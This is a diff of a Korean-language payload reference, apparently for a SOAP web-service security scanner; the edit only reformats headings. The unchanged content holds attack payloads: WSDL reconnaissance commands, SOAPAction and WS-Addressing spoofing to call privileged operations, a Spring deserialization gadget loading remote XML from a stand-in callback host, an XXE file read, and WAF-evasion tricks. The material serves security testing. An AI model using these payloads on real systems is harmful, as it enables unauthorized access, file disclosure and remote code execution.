@@ -1,6 +1,6 @@
 ### 정찰 페이로드
 
-**WSDL/MEX endpoint 발견:**
+#### WSDL/MEX endpoint 발견
 ```bash
 curl "https://target/ws/service?wsdl"
 curl "https://target/ws/service?singleWsdl"
@@ -10,20 +10,20 @@ curl "https://target/services?wsdl"
 curl "https://target/api/soap?wsdl"
 ```
 
-**SOAP endpoint 후보 경로:**
+#### SOAP endpoint 후보 경로
 - `/ws/*`, `/services/*`, `/soap/*`, `/api/soap`
 - `*.asmx` (ASP.NET)
 - `/cxf/*` (Apache CXF)
 - `/axis/*`, `/axis2/*` (Apache Axis)
 - `/services/Service1`, `/services/Service1.svc` (.NET WCF)
 
-**WSDL에서 operation/binding 추출:**
+#### WSDL에서 operation/binding 추출
 ```bash
 curl -s "https://target/ws/service?wsdl" | grep -oE 'name="[^"]+"' | head -50
 # operation 이름, port type, binding 정보 수집
 ```
 
-**Operation 권한 등급 추측:**
+#### Operation 권한 등급 추측
 - 일반 op: `getInfo`, `searchUser`, `lookup`
 - 권한 op: `deleteUser`, `setRole`, `adminUpdate`, `getAdminConfig`
 
@@ -31,7 +31,7 @@ curl -s "https://target/ws/service?wsdl" | grep -oE 'name="[^"]+"' | head -50
 
 ### 기본 페이로드
 
-**SOAPAction vs Body 불일치 (핵심 우회):**
+#### SOAPAction vs Body 불일치 (핵심 우회)
 ```xml
 POST /ws/service
 Content-Type: text/xml; charset=utf-8
@@ -45,7 +45,7 @@ SOAPAction: "getUserInfo"
 </soap:Envelope>
 ```
 
-**SOAP 1.2 Action (Content-Type 안 action 파라미터):**
+#### SOAP 1.2 Action (Content-Type 안 action 파라미터)
 ```xml
 POST /ws/service
 Content-Type: application/soap+xml; charset=utf-8; action="getUserInfo"
@@ -58,14 +58,14 @@ Content-Type: application/soap+xml; charset=utf-8; action="getUserInfo"
 </soap:Envelope>
 ```
 
-**빈/누락 SOAPAction:**
+#### 빈/누락 SOAPAction
 ```
 SOAPAction: ""
 SOAPAction: 
 (SOAPAction 헤더 자체 누락)
 ```
 
-**Namespace 변조:**
+#### Namespace 변조
 ```xml
 <soap:Body>
   <getUserInfo xmlns="http://different/ns"><userId>1</userId></getUserInfo>
@@ -78,7 +78,7 @@ SOAPAction:
 <arg xsi:type="org.springframework.context.support.ClassPathXmlApplicationContext">http://CALLBACK/evil.xml</arg>
 ```
 
-**WS-Security 누락 (`NO_WSSEC` 라벨):**
+#### WS-Security 누락 (`NO_WSSEC` 라벨)
 ```xml
 <!-- UsernameToken/Timestamp/Signature 없이 권한 op 호출 -->
 <soap:Envelope>
@@ -88,7 +88,7 @@ SOAPAction:
 </soap:Envelope>
 ```
 
-**WS-Addressing wsa:Action 변조:**
+#### WS-Addressing wsa:Action 변조
 ```xml
 <soap:Header>
   <wsa:Action xmlns:wsa="http://www.w3.org/2005/08/addressing">getAdminConfig</wsa:Action>
@@ -98,19 +98,19 @@ SOAPAction:
 </soap:Body>
 ```
 
-**WS-Trust/WS-Federation 토큰 검증 우회:**
+#### WS-Trust/WS-Federation 토큰 검증 우회
 ```xml
 <!-- 토큰 없이 또는 임의 토큰으로 권한 op 호출 -->
 <wst:RequestSecurityToken>...</wst:RequestSecurityToken>
 ```
 
-**MTOM/XOP 첨부에 페이로드 숨김:**
+#### MTOM/XOP 첨부에 페이로드 숨김
 ```
 Content-Type: multipart/related; type="application/xop+xml"; boundary=---
 # 첨부에 악성 SOAP 본문
 ```
 
-**XXE 결합 (xxe-scanner 영역이지만 SOAP에서 트리거):**
+#### XXE 결합 (xxe-scanner 영역이지만 SOAP에서 트리거)
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
@@ -134,7 +134,7 @@ Content-Type: multipart/related; type="application/xop+xml"; boundary=---
 | WAF SOAPAction 필터 | Body operation은 미검사 — Body 변경 |
 | Endpoint URL 화이트리스트 | WSDL operation overloading — 같은 endpoint 다른 op |
 
-**Encoding 변형:**
+#### Encoding 변형
 ```xml
 <!-- entity로 op 이름 분할 (일부 파서) -->
 <get&#x55;serInfo>...
